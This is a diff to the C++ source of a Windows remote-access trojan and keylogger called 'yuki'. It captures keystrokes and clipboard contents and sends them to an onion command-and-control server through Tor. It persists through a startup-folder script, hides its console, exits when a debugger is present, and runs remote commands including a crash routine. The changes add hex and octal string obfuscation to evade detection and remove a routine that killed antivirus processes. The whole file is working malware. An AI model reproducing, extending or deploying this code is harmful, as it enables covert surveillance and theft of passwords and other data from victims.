@@ -4,92 +4,55 @@
 #include <string>
 #include <cstdlib>
 #include <fstream>
-#include <unistd.h>
 #include <tchar.h>
 #include <locale.h>
 #include <shlobj.h>
 #include <Windows.h>
 #include <filesystem>
 #include <wininet.h>
+#include <dirent.h>
 #include <fcntl.h>
 #include <psapi.h>
-#include <tlhelp32.h>
 #include <random>
 
 #define MAX                 65536
-#define cnc_onion_server    "z2b5cjxk4utmaktdrwiz5qlzxqve5rjedmplqgrceutvmurwadlc4gqd.onion"
+#define cnc_onion_server    "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.onion"
 
 HHOOK hHook;
 SOCKET fd;
 
 HANDLE hClip;
 char* str;
-char buf[4096];
+char buf_c[4096];
 
-HANDLE             lSnapshot, myproc;
-BOOL               rProcessFound;
-PROCESSENTRY32     uProcess;
-
-char *strstr(const WCHAR*s1, const char *s2)
+void clip_log()
 {
-    const WCHAR *p1 = s1;
-    const char  *p2 = s2;
-
-    while (*p1 && *p2) {
-        if (*p1 == *p2) {
-            p1++;
-            p2++;
-        }
-        else {
-            p1 -= p2 - s2 - 1;
-            p2 = s2;
-        }
-    }
-    return (*p2 ? NULL : (char *)(p1 - (p2 - s2)));
-}
-
-void StopAV(const char *antivirus)
-{
-    BOOL term;
-    lSnapshot       = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    uProcess.dwSize = sizeof(uProcess);
-    rProcessFound   = Process32First(lSnapshot, &uProcess);
-    while (rProcessFound) {
-        if (strstr(uProcess.szExeFile, antivirus) != NULL) {
-            myproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, uProcess.th32ProcessID);
-            if (myproc != NULL) term = TerminateProcess(myproc, 0);
-            if (term) ;
-            CloseHandle(myproc);
-        }
-        rProcessFound = Process32Next(lSnapshot,&uProcess);
-    }
-    CloseHandle(lSnapshot);
-}
-
-void Log(std::string input) {
-    const char *buf = input.c_str();
-    send(fd, buf, 4096, 0);
-}
-
-void clip_log() {
     OpenClipboard(NULL);
     hClip = GetClipboardData(CF_TEXT);
     if (hClip != NULL) {
         str = (char*)GlobalLock(hClip);
-        if (strcmp(buf, str) != 0) {
+        if (strcmp(buf_c, str) != 0) {
             send(fd, str, 4096, 0);
-            strncpy(buf, str, sizeof(buf));
+            strncpy(buf_c, str, sizeof(buf_c));
         }
         GlobalUnlock(hClip);
     }
     CloseClipboard();
 }
 
+char keyl[32];
+
+void Log(const char *input)
+{
+    strcpy(keyl, input);
+    strcat(keyl, "\n");
+    send(fd, keyl, 4096, 0);
+}
+
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION) {
         KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
         if (wParam == WM_KEYDOWN) {
-            char key[4];
             DWORD vkCode = kbd->vkCode;
             if (vkCode >= 0x30 && vkCode <= 0x39) {
                 if (GetAsyncKeyState(VK_SHIFT)) {
@@ -127,15 +90,121 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                     }
                 }
                 else {
-                    sprintf_s(key, "%c", vkCode);
-                    Log(key);
+                    switch (vkCode) {
+                    case 0x30:
+                        Log("0");
+                        break;
+                    case 0x31:
+                        Log("1");
+                        break;
+                    case 0x32:
+                        Log("2");
+                        break;
+                    case 0x33:
+                        Log("3");
+                        break;
+                    case 0x34:
+                        Log("4");
+                        break;
+                    case 0x35:
+                        Log("5");
+                        break;
+                    case 0x36:
+                        Log("6");
+                        break;
+                    case 0x37:
+                        Log("7");
+                        break;
+                    case 0x38:
+                        Log("8");
+                        break;
+                    case 0x39:
+                        Log("9");
+                        break;
+                    }
                 }
             }
             else if (vkCode >= 0x41 && vkCode <= 0x5A) {
-                if (GetAsyncKeyState(VK_SHIFT) == FALSE)
-                    vkCode += 32;
-                sprintf_s(key, "%c", vkCode);
-                Log(key);
+                switch (vkCode) {
+                case 0x41:
+                    Log("a");
+                    break;
+                case 0x42:
+                    Log("b");
+                    break;
+                case 0x43:
+                    Log("c");
+                    break;
+                case 0x44:
+                    Log("d");
+                    break;
+                case 0x45:
+                    Log("e");
+                    break;
+                case 0x46:
+                    Log("f");
+                    break;
+                case 0x47:
+                    Log("g");
+                    break;
+                case 0x48:
+                    Log("h");
+                    break;
+                case 0x49:
+                    Log("i");
+                    break;
+                case 0x4A:
+                    Log("j");
+                    break;
+                case 0x4B:
+                    Log("k");
+                    break;
+                case 0x4C:
+                    Log("l");
+                    break;
+                case 0x4D:
+                    Log("m");
+                    break;
+                case 0x4E:
+                    Log("n");
+                    break;
+                case 0x4F:
+                    Log("o");
+                    break;
+                case 0x50:
+                    Log("p");
+                    break;
+                case 0x51:
+                    Log("q");
+                    break;
+                case 0x52:
+                    Log("r");
+                    break;
+                case 0x53:
+                    Log("s");
+                    break;
+                case 0x54:
+                    Log("t");
+                    break;
+                case 0x55:
+                    Log("u");
+                    break;
+                case 0x56:
+                    Log("v");
+                    break;
+                case 0x57:
+                    Log("w");
+                    break;
+                case 0x58:
+                    Log("x");
+                    break;
+                case 0x59:
+                    Log("y");
+                    break;
+                case 0x5A:
+                    Log("z");
+                    break;
+                }
             }
             else {
                 switch (vkCode) {
@@ -182,7 +251,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                     Log("[CANCEL]");
                     break;
                 case VK_BACK:
-                    Log("[BACKSPACE]");
+                    Log("[BACKSPACE]\r");
                     break;
                 case VK_TAB:
                     Log("[TAB]");
@@ -191,7 +260,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                     Log("[CLEAR]");
                     break;
                 case VK_RETURN:
-                    Log("[ENTER]\n");
+                    Log("[ENTER]");
                     break;
                 case VK_CONTROL:
                     Log("[CTRL]");
@@ -350,7 +419,7 @@ static void start_tor()
     STARTUPINFO si{};
     PROCESS_INFORMATION pi{};
     si.cb = sizeof(si);
-    CreateProcess(nullptr, (LPSTR)"C:\\Windows\\Temp\\tor.exe", nullptr, nullptr, false, 0, nullptr, nullptr, &si, &pi);
+    CreateProcess(nullptr, (LPSTR)"\x43"":\134W\x69""n\144o\x77""s\134T\x65""m\160\\\x74""o\162.\x65\x78\145", nullptr, nullptr, false, 0, nullptr, nullptr, &si, &pi);
 }
 
 int wget(HINTERNET hInet, const TCHAR* url, FILE* fp)
@@ -359,13 +428,10 @@ int wget(HINTERNET hInet, const TCHAR* url, FILE* fp)
     HINTERNET hUrl;
 
     hUrl = InternetOpenUrl(hInet, url, NULL, 0, 0, 0);
-    if (hUrl == NULL) {
-        return 1;
-    }
+    if (hUrl == NULL) return 1;
 
-    int len;
-    int size = 0;
-    for (;;){
+    int len, size = 0;
+    while (1) {
         InternetReadFile(hUrl, buf, sizeof(buf), (LPDWORD)&len);
         if (len <= 0) break;
         fwrite(buf, sizeof(0[buf]), len, fp);
@@ -454,12 +520,10 @@ void start_up(int a)
 {
     TCHAR path[512];
     TCHAR *s = (TCHAR*)"\\yuki.cmd";
-    TCHAR *d = (TCHAR*)"@echo\x20off\nC:\\Windows\\Temp\\yuki.exe 255 crash";
+    TCHAR *d = (TCHAR*)"@echo off\nC:\\Windows\\Temp\\yuki.exe 255 crash";
     DWORD dwNumberOfBytesWritten;
     while (1) {
-        if (SHGetSpecialFolderPath(NULL, path, CSIDL_STARTUP, 0) == TRUE) {
-            my_strcat(path, s);
-        }
+        if (SHGetSpecialFolderPath(NULL, path, CSIDL_STARTUP, 0) == TRUE)  my_strcat(path, s);
         if (DeleteFile(path) == FALSE) continue;
         HANDLE hFile = CreateFile(
             path, GENERIC_READ | GENERIC_WRITE, 0, NULL,
@@ -475,20 +539,16 @@ void start_up()
 {
     TCHAR path[512];
     TCHAR *s = (TCHAR*)"\\yuki.cmd";
-    TCHAR *d = (TCHAR*)"@echo\x20off\nC:\\Windows\\Temp\\yuki.exe 255";
+    TCHAR *d = (TCHAR*)"@echo off\nC:\\Windows\\Temp\\yuki.exe 255";
     DWORD dwNumberOfBytesWritten;
     self_duplicating();
     while (1) {
-        if (SHGetSpecialFolderPath(NULL, path, CSIDL_STARTUP, 0) == TRUE) {
-            my_strcat(path, s);
-        }
+        if (SHGetSpecialFolderPath(NULL, path, CSIDL_STARTUP, 0) == TRUE) my_strcat(path, s);
         HANDLE hFile = CreateFile(
             path, GENERIC_READ | GENERIC_WRITE, 0, NULL,
             CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL
         );
-        if (!WriteFile(hFile, d, lstrlen(d), &dwNumberOfBytesWritten, NULL)) {
-            continue;
-        }
+        if (!WriteFile(hFile, d, lstrlen(d), &dwNumberOfBytesWritten, NULL)) continue;
         CloseHandle(hFile);
         wget();
         break;
@@ -496,22 +556,23 @@ void start_up()
 }
 
 const char *sites[] = {
-    "https://duckduckgo.com/",
-    "calculator",
-    "notepad",
-    "cmd",
-    "write",
-    "regedit",
-    "explorer",
-    "taskmgr",
-    "msconfig",
-    "mspaint",
-    "devmgmt.msc",
-    "control",
-    "mmc",
+    "\x68""t\164p\x73"":\057/\x64""u\143k\x64""u\143k\x67""o\056c\x6F""m\057",
+    "\x63""a\154c\x75""l\141t\x6F""r",
+    "\x6E""o\164e\x70""a\144",
+    "\x63""m\144",
+    "\x77""r\151t\x65""",
+    "\x72""e\147e\x64""i\164",
+    "\x65""x\160l\x6F""r\145r",
+    "\x74""a\163k\x6D""g\162",
+    "\x6D""s\143o\x6E""f\151g",
+    "\x6D""s\160a\x69""n\164",
+    "\x64""e\166m\x67""m\164.\x6D""s\143",
+    "\x63""o\156t\x72""o\154",
+    "\x6D""m\143",
 };
 
-DWORD WINAPI alert(LPVOID lpstart) {
+DWORD WINAPI alert(LPVOID lpstart)
+{
     while (1) {
         MessageBeep(MB_ICONHAND);
         Sleep(1000);
@@ -567,17 +628,13 @@ int main(int argc, char **argv)
     HANDLE hMutex = CreateMutex(NULL, FALSE, _T("test"));
     if (GetLastError() == ERROR_ALREADY_EXISTS || hMutex == NULL) return 1;
 
-    //FreeConsole();
     AllocConsole();
-    HWND window = FindWindowA("ConsoleWindowClass", NULL);
+    HWND window = FindWindowA("\x43""o\156s\x6F""l\145W\x69""n\144o\x77""C\154a\x73""s", NULL);
     ShowWindow(window, 0);
 
     if (IsDebuggerPresent()) ExitProcess(1);
 
-    if (argc != 2) {
-        StopAV("WmiPrvSE.exe");
-        start_up();
-    }
+    if (argc != 2) start_up();
     if (argc == 3) crash();
 
     std::thread th_tor(start_tor);
@@ -598,7 +655,7 @@ int main(int argc, char **argv)
     SocketAddr.sin_port         = htons(9050);
     SocketAddr.sin_addr.s_addr  = inet_addr("127.0.0.1");
 
-    while (1) {
+    do {
         Socket = socket(AF_INET, SOCK_STREAM, 0);
         fd = Socket;
 
@@ -607,34 +664,26 @@ int main(int argc, char **argv)
             continue;
         }
 
-        char Req1[3] = {
-            0x05, // SOCKS 5
-            0x01, // One Authentication Method
-            0x00  // No AUthentication
-        };
+        char Req1[3] = { 0x05, 0x01, 0x00 };
         send(Socket, Req1, 3, 0);
 
         char Resp1[2];
         recv(Socket, Resp1, 2, 0);
-        if (1[Resp1] != 0x00) continue;
+        if (1[Resp1] != 0x00) {
+            std::this_thread::sleep_for(std::chrono::seconds(3));
+            continue;
+        }
 
         char Domain[] = cnc_onion_server;
         char  DomainLen = (char)strlen(Domain);
         short Port = htons(80);
-
-        char TmpReq[4] = {
-            0x05, // SOCKS5
-            0x01, // CONNECT
-            0x00, // RESERVED
-            0x03, // DOMAIN
-        };
-
+        char TmpReq[4] = { 0x05, 0x01, 0x00, 0x03 };
         char* Req2 = new char[4 + 1 + DomainLen + 2];
 
-        memcpy(Req2, TmpReq, 4);                // 5, 1, 0, 3
-        memcpy(Req2 + 4, &DomainLen, 1);        // Domain Length
-        memcpy(Req2 + 5, Domain, DomainLen);    // Domain
-        memcpy(Req2 + 5 + DomainLen, &Port, 2); // Port
+        memcpy(Req2, TmpReq, 4);
+        memcpy(Req2 + 4, &DomainLen, 1);
+        memcpy(Req2 + 5, Domain, DomainLen);
+        memcpy(Req2 + 5 + DomainLen, &Port, 2);
 
         send(Socket, (char*)Req2, 4 + 1 + DomainLen + 2, 0);
 
@@ -642,65 +691,67 @@ int main(int argc, char **argv)
 
         char Resp2[10];
         recv(Socket, Resp2, 10, 0);
-        if (1[Resp2] != 0x00) continue;
-
-        std::filesystem::path path = std::filesystem::current_path();
-        std::string path_string{path.u8string()};
-        char carry[path_string.size()];
-        path_string.copy(carry, path_string.size());
+        if (1[Resp2] != 0x00) {
+            std::this_thread::sleep_for(std::chrono::seconds(3));
+            continue;
+        }
 
         while (1) {
             recv(Socket, recv_buf, sizeof(recv_buf), 0);
             recv_buf[strcspn(recv_buf, "\r\n")] = 0;
 
             if (!strcmp(recv_buf, "!q")) break;
-            if (!strcmp(recv_buf, "pwd")) {
+            if (!strcmp(recv_buf, "\x70""w\144")) {
+                std::filesystem::path path = std::filesystem::current_path();
+                std::string path_string{path.u8string()};
+                char carry[path_string.size()];
+                path_string.copy(carry, path_string.size());
                 strcpy(send_buf, carry);
             }
-            else if (!strcmp(recv_buf, "keylogger")) {
-                keylog();
-            }
-            else if (!strcmp(recv_buf, "cliplogger")) {
+            else if (!strcmp(recv_buf, "\x6B""e\171l\x6F""g\147e\x72""")) keylog();
+            else if (!strcmp(recv_buf, "\x63""l\151p\x6C""o\147g\x65""r")) {
                 OpenClipboard(NULL);
                 hClip = GetClipboardData(CF_TEXT);
-                    if (hClip != NULL) {
+                if (hClip != NULL) {
                     str = (char*)GlobalLock(hClip);
-                    send(Socket, str, strlen(str), 0);
+                    send(Socket, str, 4096, 0);
                     GlobalUnlock(hClip);
                 }
-                strncpy(buf, str, sizeof(buf));
+                strncpy(buf_c, str, sizeof(buf_c));
                 CloseClipboard();
                 while (1) {
                     Sleep(1000);
                     clip_log();
                 }
+                continue;
             }
-            else if (!strcmp(recv_buf, "all_log")) {
+            else if (!strcmp(recv_buf, "\x61""l\154_\x6C""o\147")) {
                 std::thread th_0(keylog);
                 th_0.join();
                 OpenClipboard(NULL);
                 hClip = GetClipboardData(CF_TEXT);
-                    if (hClip != NULL) {
+                if (hClip != NULL) {
                     str = (char*)GlobalLock(hClip);
-                    send(Socket, str, strlen(str), 0);
+                    send(Socket, str, 4096, 0);
                     GlobalUnlock(hClip);
                 }
-                strncpy(buf, str, sizeof(buf));
+                strncpy(buf_c, str, sizeof(buf_c));
                 CloseClipboard();
                 while (1) {
                     Sleep(1000);
                     clip_log();
                 }
-                Sleep(-1);
+                continue;
             }
-            else if (!strcmp(recv_buf, "crash")) {
+            else if (!strcmp(recv_buf, "\x63""r\141s\x68""")) {
                 start_up(1);
                 crash();
+                continue;
             }
             send(Socket, send_buf, strlen(send_buf), 0);
             memset(send_buf, 0, MAX*sizeof(0[send_buf]));
         }
-    }
+    } while (1);
     closesocket(Socket);
     WSACleanup();
     return 0;
